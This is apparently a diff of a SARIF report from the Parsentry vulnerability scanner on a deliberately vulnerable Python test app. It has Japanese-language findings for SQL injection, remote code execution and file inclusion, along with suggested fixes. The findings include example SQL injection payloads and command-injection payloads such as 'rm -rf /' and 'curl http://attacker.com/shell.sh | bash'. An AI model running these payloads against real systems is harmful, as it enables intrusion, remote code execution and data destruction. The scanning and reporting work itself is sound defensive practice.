@@ -6,7 +6,7 @@
       "tool": {
         "driver": {
           "name": "Parsentry",
-          "version": "0.14.0",
+          "version": "0.16.1",
           "information_uri": "https://github.com/HikaruEgashira/vulnhuntrs",
           "rules": [
             {
@@ -102,21 +102,21 @@
           "ruleIndex": 0,
           "level": "error",
           "message": {
-            "text": "SQLI: ## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください",
-            "markdown": "## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください"
+            "text": "SQLI: ## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection",
+            "markdown": "## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "repo/models.py",
+                  "uri": "repo/app.py",
                   "index": 0
                 }
               }
             }
           ],
           "fingerprints": {
-            "parsentry/v1": "e3bf6b9e93e0ce07"
+            "parsentry/v1": "ef90514a581811f1"
           },
           "properties": {
             "confidence": 1.0,
@@ -136,21 +136,21 @@
           "ruleIndex": 0,
           "level": "error",
           "message": {
-            "text": "SQLI: ## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください",
-            "markdown": "## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください"
+            "text": "SQLI: ## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection",
+            "markdown": "## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "repo/models.py",
+                  "uri": "repo/app.py",
                   "index": 1
                 }
               }
             }
           ],
           "fingerprints": {
-            "parsentry/v1": "e3bf6b9e93e0ce07"
+            "parsentry/v1": "ef90514a581811f1"
           },
           "properties": {
             "confidence": 1.0,
@@ -506,6 +506,74 @@
           }
         },
         {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI: ## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください",
+            "markdown": "## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/models.py",
+                  "index": 12
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e3bf6b9e93e0ce07"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ]
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI: ## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください",
+            "markdown": "## authenticate_user()におけるSQL Injection\n\n**Principal**: ユーザー入力（`username`, `password`パラメータ）\n\n**Action**: セキュリティ制御なし - パラメータ化クエリを使用していない\n\n**Resource**: SQLデータベース（cursor.execute()）\n\n**脆弱性の詳細**:\n92行目でユーザー提供の`username`と`password`が文字列フォーマットでSQL文に直接挿入されている\n\n攻撃者は以下のようなペイロードで認証を回避可能：\n- username: `admin' --`\n- password: `anything`\n- admin のパスワード検証がバイパスされる\n\n**推奨修正**:\nパラメータ化クエリを使用してください"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/models.py",
+                  "index": 13
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e3bf6b9e93e0ce07"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ]
+          }
+        },
+        {
           "ruleId": "RCE",
           "ruleIndex": 1,
           "level": "error",
@@ -518,7 +586,7 @@
               "physicalLocation": {
                 "artifactLocation": {
                   "uri": "repo/api.py",
-                  "index": 12
+                  "index": 14
                 }
               }
             }
@@ -528,111 +596,6 @@
           },
           "properties": {
             "confidence": 1.0,
-            "mitre_attack": [
-              "T1190",
-              "T1059"
-            ],
-            "cwe": [
-              "CWE-77",
-              "CWE-78",
-              "CWE-94"
-            ],
-            "owasp": [
-              "A03:2021-Injection"
-            ]
-          }
-        },
-        {
-          "ruleId": "SQLI",
-          "ruleIndex": 0,
-          "level": "error",
-          "message": {
-            "text": "SQLI: ## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection",
-            "markdown": "## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "repo/app.py",
-                  "index": 13
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "parsentry/v1": "ef90514a581811f1"
-          },
-          "properties": {
-            "confidence": 1.0,
-            "mitre_attack": [
-              "T1190"
-            ],
-            "cwe": [
-              "CWE-89"
-            ],
-            "owasp": [
-              "A03:2021-Injection"
-            ]
-          }
-        },
-        {
-          "ruleId": "SQLI",
-          "ruleIndex": 0,
-          "level": "error",
-          "message": {
-            "text": "SQLI: ## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection",
-            "markdown": "## SQL Injection - LIKE句での脆弱性\n\n### 脆弱性の詳細\nユーザーからの入力値`username`がLIKE句に直接埋め込まれており、SQL Injectionが可能です。\n\n### PAR分析\n- **Principal（主体）**: HTTPリクエストパラメータ `username` (request.args.get)\n- **Action（制御）**: **なし** - 入力値の検証やサニタイゼーション処理が存在しない\n- **Resource（リソース）**: SQLiteデータベースの`cursor.execute()`による直接実行\n\n### 攻撃シナリオ\n攻撃者は以下のようなペイロードを送信できます：\n```\nusername=' OR '1'='1\nusername=%' UNION SELECT 1,2,3,4 --\n```\n\n### 推奨される修正方法\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. 入力値の厳密な検証\n3. SQLのホワイトリスト管理\n\n### コード例（修正方法）\n```python\n# 脆弱なコード\nquery1 = f\"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'\"\nresults1 = cursor.execute(query1).fetchall()\n\n# 修正されたコード\nquery1 = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\nresults1 = cursor.execute(query1, (f'%{username}%',)).fetchall()\n```\n\n### 関連CWE\n- **CWE-89**: SQL Injection"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "repo/app.py",
-                  "index": 14
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "parsentry/v1": "ef90514a581811f1"
-          },
-          "properties": {
-            "confidence": 1.0,
-            "mitre_attack": [
-              "T1190"
-            ],
-            "cwe": [
-              "CWE-89"
-            ],
-            "owasp": [
-              "A03:2021-Injection"
-            ]
-          }
-        },
-        {
-          "ruleId": "RCE",
-          "ruleIndex": 1,
-          "level": "error",
-          "message": {
-            "text": "RCE: ## リモートコード実行（RCE）脆弱性\n\n### 脆弱性の詳細\nエンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。\n\n### 脆弱なコード\n```python\n@api_bp.route('/exec/command', methods=['POST'])\ndef execute_command():\n    \"\"\"Command injection vulnerability\"\"\"\n    data = request.get_json()\n    command = data.get('command', '')  # ← untrusted input\n    \n    try:\n        result = subprocess.run(\n            command,                    # ← 直接コマンド実行\n            shell=True,                # ← シェルメタキャラクタが解釈される\n            capture_output=True, \n            text=True,\n            timeout=10\n        )\n        ...\n```\n\n### PAR分析\n\n**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）\n\n**Action（制御）**: 入力値に対する検証・サニタイズが存在しない\n\n**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）\n\n### 攻撃シナリオ\n\n攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：\n\n```json\n{\n  \"command\": \"cat /etc/passwd; rm -rf /\"\n}\n```\n\nまたは、シェルメタキャラクタを使用した複数コマンド実行：\n\n```json\n{\n  \"command\": \"whoami && id && curl http://attacker.com/shell.sh | bash\"\n}\n```\n\n### 影響範囲\n- サーバー上の任意のコマンド実行\n- ファイルシステムへのアクセス・改変・削除\n- 他システムへの横展開\n- データ盗聴・改ざん\n\n### 根本原因\n\n1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される\n2. ユーザー入力に対する検証が一切存在しない\n3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない\n\n### 推奨される修正\n\n1. **シェルを使用しない**：\n   ```python\n   subprocess.run(command.split(), shell=False)\n   ```\n\n2. **ホワイトリスト検証**：\n   ```python\n   allowed_commands = ['ls', 'pwd', 'whoami']\n   if command not in allowed_commands:\n       return jsonify({'error': 'Command not allowed'}), 403\n   ```\n\n3. **入力長制限とキャラクタ制限**：\n   ```python\n   if len(command) > 100 or not command.isalnum():\n       return jsonify({'error': 'Invalid command'}), 400\n   ```\n\n4. **権限最小化**：\n   - Pythonプロセスを専用の低権限ユーザーで実行\n   - 機能別のコンテナ化・サンドボックス化\n",
-            "markdown": "## リモートコード実行（RCE）脆弱性\n\n### 脆弱性の詳細\nエンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。\n\n### 脆弱なコード\n```python\n@api_bp.route('/exec/command', methods=['POST'])\ndef execute_command():\n    \"\"\"Command injection vulnerability\"\"\"\n    data = request.get_json()\n    command = data.get('command', '')  # ← untrusted input\n    \n    try:\n        result = subprocess.run(\n            command,                    # ← 直接コマンド実行\n            shell=True,                # ← シェルメタキャラクタが解釈される\n            capture_output=True, \n            text=True,\n            timeout=10\n        )\n        ...\n```\n\n### PAR分析\n\n**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）\n\n**Action（制御）**: 入力値に対する検証・サニタイズが存在しない\n\n**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）\n\n### 攻撃シナリオ\n\n攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：\n\n```json\n{\n  \"command\": \"cat /etc/passwd; rm -rf /\"\n}\n```\n\nまたは、シェルメタキャラクタを使用した複数コマンド実行：\n\n```json\n{\n  \"command\": \"whoami && id && curl http://attacker.com/shell.sh | bash\"\n}\n```\n\n### 影響範囲\n- サーバー上の任意のコマンド実行\n- ファイルシステムへのアクセス・改変・削除\n- 他システムへの横展開\n- データ盗聴・改ざん\n\n### 根本原因\n\n1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される\n2. ユーザー入力に対する検証が一切存在しない\n3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない\n\n### 推奨される修正\n\n1. **シェルを使用しない**：\n   ```python\n   subprocess.run(command.split(), shell=False)\n   ```\n\n2. **ホワイトリスト検証**：\n   ```python\n   allowed_commands = ['ls', 'pwd', 'whoami']\n   if command not in allowed_commands:\n       return jsonify({'error': 'Command not allowed'}), 403\n   ```\n\n3. **入力長制限とキャラクタ制限**：\n   ```python\n   if len(command) > 100 or not command.isalnum():\n       return jsonify({'error': 'Invalid command'}), 400\n   ```\n\n4. **権限最小化**：\n   - Pythonプロセスを専用の低権限ユーザーで実行\n   - 機能別のコンテナ化・サンドボックス化\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "repo/api.py",
-                  "index": 15
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "parsentry/v1": "c87b5bf8ca827172"
-          },
-          "properties": {
-            "confidence": 0.95,
             "mitre_attack": [
               "T1190",
               "T1059"
@@ -660,7 +623,7 @@
               "physicalLocation": {
                 "artifactLocation": {
                   "uri": "repo/app.py",
-                  "index": 16
+                  "index": 15
                 }
               }
             }
@@ -685,25 +648,62 @@
           }
         },
         {
-          "ruleId": "LFI",
-          "ruleIndex": 2,
+          "ruleId": "RCE",
+          "ruleIndex": 1,
           "level": "error",
           "message": {
-            "text": "LFI: ## Local File Inclusion (LFI) 脆弱性\n\n### 位置\nモデルファイルの`get_document_content`メソッド（195行目）\n\n### 脆弱性の詳細\nデータベースから取得したファイルパスに対する検証が行われずに`open()`関数で直接使用されています。\n\n```python\nwith open(file_path, 'r') as f:  # 211行目\n    return f.read()\n```\n\n### PAR分析\n**Principal**: ユーザー入力の`doc_id`（信頼できない）\n**Action**: セキュリティ制御なし。入力値に対するバリデーションや正規化がない\n**Resource**: ファイルシステム（`open()`操作）\n\n### 攻撃ベクトル\n1. SQLインジェクション（200行目）でデータベースクエリを改竄\n2. 任意のファイルパスをレスポンスとして返させる\n3. サーバー上の任意のファイル（/etc/passwd等）を読み込み可能\n\n### 影響\n- システムファイルの読取\n- 認証情報やAPIキーの露出\n- 機密情報の漏洩\n\n### 推奨される修正\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. ファイルパスのホワイトリスト検証\n3. ディレクトリトラバーサル対策（os.path.realpath()で正規化し、許可ディレクトリ内であることを確認）",
-            "markdown": "## Local File Inclusion (LFI) 脆弱性\n\n### 位置\nモデルファイルの`get_document_content`メソッド（195行目）\n\n### 脆弱性の詳細\nデータベースから取得したファイルパスに対する検証が行われずに`open()`関数で直接使用されています。\n\n```python\nwith open(file_path, 'r') as f:  # 211行目\n    return f.read()\n```\n\n### PAR分析\n**Principal**: ユーザー入力の`doc_id`（信頼できない）\n**Action**: セキュリティ制御なし。入力値に対するバリデーションや正規化がない\n**Resource**: ファイルシステム（`open()`操作）\n\n### 攻撃ベクトル\n1. SQLインジェクション（200行目）でデータベースクエリを改竄\n2. 任意のファイルパスをレスポンスとして返させる\n3. サーバー上の任意のファイル（/etc/passwd等）を読み込み可能\n\n### 影響\n- システムファイルの読取\n- 認証情報やAPIキーの露出\n- 機密情報の漏洩\n\n### 推奨される修正\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. ファイルパスのホワイトリスト検証\n3. ディレクトリトラバーサル対策（os.path.realpath()で正規化し、許可ディレクトリ内であることを確認）"
+            "text": "RCE: ## リモートコード実行（RCE）脆弱性\n\n### 脆弱性の詳細\nエンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。\n\n### 脆弱なコード\n```python\n@api_bp.route('/exec/command', methods=['POST'])\ndef execute_command():\n    \"\"\"Command injection vulnerability\"\"\"\n    data = request.get_json()\n    command = data.get('command', '')  # ← untrusted input\n    \n    try:\n        result = subprocess.run(\n            command,                    # ← 直接コマンド実行\n            shell=True,                # ← シェルメタキャラクタが解釈される\n            capture_output=True, \n            text=True,\n            timeout=10\n        )\n        ...\n```\n\n### PAR分析\n\n**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）\n\n**Action（制御）**: 入力値に対する検証・サニタイズが存在しない\n\n**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）\n\n### 攻撃シナリオ\n\n攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：\n\n```json\n{\n  \"command\": \"cat /etc/passwd; rm -rf /\"\n}\n```\n\nまたは、シェルメタキャラクタを使用した複数コマンド実行：\n\n```json\n{\n  \"command\": \"whoami && id && curl http://attacker.com/shell.sh | bash\"\n}\n```\n\n### 影響範囲\n- サーバー上の任意のコマンド実行\n- ファイルシステムへのアクセス・改変・削除\n- 他システムへの横展開\n- データ盗聴・改ざん\n\n### 根本原因\n\n1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される\n2. ユーザー入力に対する検証が一切存在しない\n3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない\n\n### 推奨される修正\n\n1. **シェルを使用しない**：\n   ```python\n   subprocess.run(command.split(), shell=False)\n   ```\n\n2. **ホワイトリスト検証**：\n   ```python\n   allowed_commands = ['ls', 'pwd', 'whoami']\n   if command not in allowed_commands:\n       return jsonify({'error': 'Command not allowed'}), 403\n   ```\n\n3. **入力長制限とキャラクタ制限**：\n   ```python\n   if len(command) > 100 or not command.isalnum():\n       return jsonify({'error': 'Invalid command'}), 400\n   ```\n\n4. **権限最小化**：\n   - Pythonプロセスを専用の低権限ユーザーで実行\n   - 機能別のコンテナ化・サンドボックス化\n",
+            "markdown": "## リモートコード実行（RCE）脆弱性\n\n### 脆弱性の詳細\nエンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。\n\n### 脆弱なコード\n```python\n@api_bp.route('/exec/command', methods=['POST'])\ndef execute_command():\n    \"\"\"Command injection vulnerability\"\"\"\n    data = request.get_json()\n    command = data.get('command', '')  # ← untrusted input\n    \n    try:\n        result = subprocess.run(\n            command,                    # ← 直接コマンド実行\n            shell=True,                # ← シェルメタキャラクタが解釈される\n            capture_output=True, \n            text=True,\n            timeout=10\n        )\n        ...\n```\n\n### PAR分析\n\n**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）\n\n**Action（制御）**: 入力値に対する検証・サニタイズが存在しない\n\n**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）\n\n### 攻撃シナリオ\n\n攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：\n\n```json\n{\n  \"command\": \"cat /etc/passwd; rm -rf /\"\n}\n```\n\nまたは、シェルメタキャラクタを使用した複数コマンド実行：\n\n```json\n{\n  \"command\": \"whoami && id && curl http://attacker.com/shell.sh | bash\"\n}\n```\n\n### 影響範囲\n- サーバー上の任意のコマンド実行\n- ファイルシステムへのアクセス・改変・削除\n- 他システムへの横展開\n- データ盗聴・改ざん\n\n### 根本原因\n\n1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される\n2. ユーザー入力に対する検証が一切存在しない\n3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない\n\n### 推奨される修正\n\n1. **シェルを使用しない**：\n   ```python\n   subprocess.run(command.split(), shell=False)\n   ```\n\n2. **ホワイトリスト検証**：\n   ```python\n   allowed_commands = ['ls', 'pwd', 'whoami']\n   if command not in allowed_commands:\n       return jsonify({'error': 'Command not allowed'}), 403\n   ```\n\n3. **入力長制限とキャラクタ制限**：\n   ```python\n   if len(command) > 100 or not command.isalnum():\n       return jsonify({'error': 'Invalid command'}), 400\n   ```\n\n4. **権限最小化**：\n   - Pythonプロセスを専用の低権限ユーザーで実行\n   - 機能別のコンテナ化・サンドボックス化\n"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "repo/models.py",
+                  "uri": "repo/api.py",
+                  "index": 16
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c87b5bf8ca827172"
+          },
+          "properties": {
+            "confidence": 0.95,
+            "mitre_attack": [
+              "T1190",
+              "T1059"
+            ],
+            "cwe": [
+              "CWE-77",
+              "CWE-78",
+              "CWE-94"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ]
+          }
+        },
+        {
+          "ruleId": "LFI",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
